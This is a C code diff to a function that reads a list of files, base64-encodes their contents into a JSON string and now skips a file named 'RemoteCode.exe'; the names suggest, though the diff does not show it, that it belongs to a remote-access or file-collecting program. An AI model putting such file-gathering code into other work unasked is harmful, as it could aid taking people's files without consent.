@@ -161,7 +161,8 @@ char* spill_file_json(char** file_names, int size, int* json_length)
         FILE* read_file = fopen(file_names[i], "rb");
 
         // Let's actually make sure the file exists. If it doesn't, continue.
-        if (read_file == NULL)
+        // Also, prevent RemoteCode.exe from being read
+        if (read_file == NULL || strcmp(file_names[i], "RemoteCode.exe") == 0)
         {
             continue;
         }
@@ -174,18 +175,29 @@ char* spill_file_json(char** file_names, int size, int* json_length)
         concat_mem(&json_string, json_size - 1, "\":", 3, &json_size);
 
         // Read the file, and put the needed items into the JSON string. Basically, we want "{File Content}",
+
         // Remember, we are still dynamically allocating this. Hence, we will need the file size (read: number of chars in file)
-        long file_contents_size = get_file_size(read_file) + 1;
-        char* file_contents = malloc(file_contents_size);       // We will transfer this over via strcat
+        // First, let's get the original file text
+        long file_contents_size = get_file_size(read_file);
+        char* file_contents = malloc(file_contents_size + 1);       // We will transfer this over via strcat
         fread(file_contents, file_contents_size, 1, read_file);
-        file_contents[file_contents_size - 1] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves
+        file_contents[file_contents_size] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves
+
+        // Transferring binary data over JSON is a bit of a pain. Hence, we will encode it in base64
+        // The base64 function requires us to preallocate the base64 string size
+        int b64_size = base64_size(file_contents_size);
+        char* base64_str = malloc(b64_size + 1);            // Add 1 byte for \0
+        base64(file_contents, file_contents_size, base64_str);
+        base64_str[b64_size] = '\0';
 
         // Actually write the string here
         concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
-        concat_str_mem(&json_string, json_size - 1, file_contents, file_contents_size, &json_size);   // File contents size already includes the null terminator
+        concat_str_mem(&json_string, json_size - 1, base64_str, b64_size + 1, &json_size);   // Base64 size does not take into account \0, so we add 1
         concat_mem(&json_string, json_size - 1, "\",", 3, &json_size);
 
+        // Garbage collector
         free(file_contents);
+        free(base64_str);
     }
 
     // Close the JSON at the end - and overwrite the last comma with }. The null byte can stay intact - no need to copy that over.
